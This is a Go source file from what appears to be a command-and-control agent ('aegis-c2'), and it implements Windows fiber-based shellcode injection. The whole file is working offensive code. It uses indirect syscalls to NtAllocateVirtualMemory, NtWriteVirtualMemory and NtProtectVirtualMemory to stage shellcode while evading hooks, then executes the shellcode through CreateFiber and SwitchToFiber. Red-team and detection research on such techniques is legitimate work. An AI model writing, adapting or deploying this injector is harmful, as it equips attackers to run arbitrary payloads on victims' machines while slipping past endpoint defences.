//go:build windows && amd64

package inject

import (
	"fmt"
	"unsafe"

	syscallPkg "github.com/aegis-c2/aegis/agent/syscall"
	stub "github.com/aegis-c2/aegis/agent/asm"
	"golang.org/x/sys/windows"
)

// isThreadAFiber checks whether the current thread is currently acting as a fiber.
func isThreadAFiber() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	proc := kernel32.NewProc("IsThreadAFiber")
	r, _, _ := proc.Call()
	return r != 0
}

// injectViaFiber 使用 Fiber Injection 执行 shellcode。
// 流程：
//  1. 间接 syscall 写入 shellcode 到目标进程（RW→RX）
//  2. 将当前线程转换为 Fiber
//  3. 创建新 Fiber，入口点 = shellcode
//  4. SwitchToFiber 执行 shellcode
//  5. 返回原 Fiber
//
// 注意：此方法在当前进程中执行 shellcode（非远程进程注入），
// 适用于需要在本进程上下文中执行后继续运行的场景。
// 如需远程进程注入，应使用 MethodIndirectSyscall 或 MethodThreadHijack。
func injectViaFiber(cfg *InjectConfig) *InjectResult {
	if len(cfg.Shellcode) == 0 {
		return &InjectResult{
			Success: false,
			Message: "empty shellcode",
		}
	}

	// 解析 ntdll.dll
	st := &syscallPkg.SyscallTable{}
	if err := st.ResolveNtdll(); err != nil {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("resolve ntdll: %v", err),
		}
	}

	indirectCall := stub.IndirectSyscall

	// Resolve required syscalls — fail early if any are missing
	// to avoid calling a wrong syscall number (0 = NtAccessCheck).
	sysNtAlloc, ok := st.GetSyscall("NtAllocateVirtualMemory")
	if !ok {
		return &InjectResult{Success: false, Message: "NtAllocateVirtualMemory not found in ntdll"}
	}
	sysNtWrite, ok := st.GetSyscall("NtWriteVirtualMemory")
	if !ok {
		return &InjectResult{Success: false, Message: "NtWriteVirtualMemory not found in ntdll"}
	}
	sysNtProtect, ok := st.GetSyscall("NtProtectVirtualMemory")
	if !ok {
		return &InjectResult{Success: false, Message: "NtProtectVirtualMemory not found in ntdll"}
	}

	// 1. 在当前进程分配 RW 内存
	allocSize := uintptr(len(cfg.Shellcode))
	baseAddr := uintptr(0)

	ntStatus := indirectCall(
		sysNtAlloc,
		uintptr(0xFFFFFFFFFFFFFFFF),                    // NtCurrentProcess
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&allocSize)),
		uintptr(0x3000),  // MEM_COMMIT | MEM_RESERVE
		uintptr(0x04),    // PAGE_READWRITE
	)
	if ntStatus != 0 {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("NtAllocateVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 2. 写入 shellcode
	bytesWritten := uintptr(0)
	ntStatus = indirectCall(
		sysNtWrite,
		uintptr(0xFFFFFFFFFFFFFFFF),
		baseAddr,
		uintptr(unsafe.Pointer(&cfg.Shellcode[0])),
		uintptr(len(cfg.Shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if ntStatus != 0 {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("NtWriteVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 3. RW → RX
	oldProtect := uintptr(0)
	// A-P0-2: NtProtectVirtualMemory 会修改 BaseAddress 指针，使用副本防止污染 baseAddr
	baseAddrCopy := baseAddr
	ntStatus = indirectCall(
		sysNtProtect,
		uintptr(0xFFFFFFFFFFFFFFFF),
		uintptr(unsafe.Pointer(&baseAddrCopy)),
		uintptr(unsafe.Pointer(&allocSize)),
		uintptr(0x20), // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProtect)),
		0,
	)
	if ntStatus != 0 {
		return &InjectResult{
			Success: false,
			Message: fmt.Sprintf("NtProtectVirtualMemory failed: 0x%X", uint32(ntStatus)),
		}
	}

	// 4. Fiber 操作（kernel32.dll，非 Nt*）
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	procConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	procCreateFiber := kernel32.NewProc("CreateFiber")
	procSwitchToFiber := kernel32.NewProc("SwitchToFiber")
	procConvertFiberToThread := kernel32.NewProc("ConvertFiberToThread")

	// 将当前线程转换为 Fiber
	mainFiber, _, _ := procConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return &InjectResult{
			Success: false,
			Message: "ConvertThreadToFiber failed",
		}
	}

	// 创建 Fiber，入口点 = shellcode 地址
	fiber, _, _ := procCreateFiber.Call(0, baseAddr, 0)
	if fiber == 0 {
		// BUG-06 fix: We're already on mainFiber (ConvertThreadToFiber succeeded
		// above), no need to SwitchToFiber. Just convert back to thread.
		procConvertFiberToThread.Call()
		windows.VirtualFree(baseAddr, 0, windows.MEM_RELEASE)
		return &InjectResult{
			Success: false,
			Message: "CreateFiber failed",
		}
	}

	// Switch to shellcode fiber. When shellcode returns, control comes back here.
	// Note: shellcode MUST NOT corrupt the fiber stack. If it performs a longjmp,
	// calls ExitThread, or modifies RSP significantly, this will crash.
	procSwitchToFiber.Call(fiber)

	// Verify we're back on the main fiber before cleanup.
	// If shellcode already converted back to thread, we CANNOT call SwitchToFiber
	// (requires the current thread to be a fiber) — bail out safely.
	if isThreadAFiber() {
		// Still on a fiber — shellcode returned normally or switched back.
		// Clean up by converting back to thread.
		procConvertFiberToThread.Call()
	}
	// Else: shellcode converted back to thread already.
	// mainFiber is unreachable without a fiber context — nothing to recover.

	// Free shellcode memory regardless of outcome.
	windows.VirtualFree(baseAddr, 0, windows.MEM_RELEASE)

	return &InjectResult{
		Success: true,
		Message: "shellcode injected successfully via Fiber Injection",
	}
}

// InjectViaFiber 公开接口。
func InjectViaFiber(cfg *InjectConfig) *InjectResult {
	return injectViaFiber(cfg)
}
